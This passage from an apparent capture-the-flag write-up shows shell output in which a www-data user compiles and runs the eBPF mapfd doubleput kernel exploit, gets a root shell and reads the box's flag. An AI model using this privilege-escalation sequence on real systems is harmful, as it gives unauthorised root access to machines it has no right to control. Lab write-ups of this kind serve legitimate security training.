cd ebpf_mapfd_doubleput_exploit/
www-data@red:/tmp/ebpf_mapfd_doubleput_exploit$ ls
ls
compile.sh  doubleput.c  hello.c  suidhelper.c
www-data@red:/tmp/ebpf_mapfd_doubleput_exploit$ ./compile.sh
./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
```
warnings are ok

```
www-data@red:/tmp/ebpf_mapfd_doubleput_exploit$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@red:/tmp/ebpf_mapfd_doubleput_exploit$ ./doubleput
./doubleput
suid file detected, launching rootshell...
we have root privs now...
fuse: mountpoint is not empty
fuse: if you are sure this is safe, use the 'nonempty' mount option
doubleput: system() failed
root@red:/tmp/ebpf_mapfd_doubleput_exploit# doubleput: child quit before we got a good file*


root@red:/tmp/ebpf_mapfd_doubleput_exploit# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

we have root !!

### flag

```
root@red:/root# cat ./flag.txt && id && hostname
cat ./flag.txt && id && hostname
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

uid=0(root) gid=0(root) groups=0(root),33(www-data)
red.initech
```
